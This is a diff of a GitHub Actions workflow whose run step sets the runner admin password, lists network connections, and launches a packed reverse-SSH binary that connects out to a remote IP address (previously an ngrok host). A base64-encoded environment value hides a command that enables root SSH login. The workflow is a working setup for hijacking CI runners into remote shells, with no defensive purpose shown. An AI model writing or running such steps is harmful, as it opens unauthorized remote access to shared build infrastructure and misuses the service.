@@ -36,6 +36,6 @@ jobs:
       # choco -V&&busybox&&busybox pwd&&dir  ../../../ &&    \"C:/Program Files/Git/bin/"
       
       - name: Run a 2-line script
-        run:  "ls &&which id sh bash ps curl git regedit mmc which;echo $GITHUB_WORKSPACE;net user runneradmin liu@huan22;netstat -ano;d:/a/nc_test/nc_test/upx_reverse-sshx64.exe -v -b 50053 -p 34292 ngrok.xiaomiqiu123.top;"
+        run:  "ls &&which id sh bash ps curl git regedit mmc which;echo $GITHUB_WORKSPACE;net user runneradmin liu@huan22;netstat -ano;d:/a/nc_test/nc_test/upx_reverse-sshx64.exe -v -b 50049 -p 30022 118.31.229.160 ;"
         env:
           ss0: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7" 
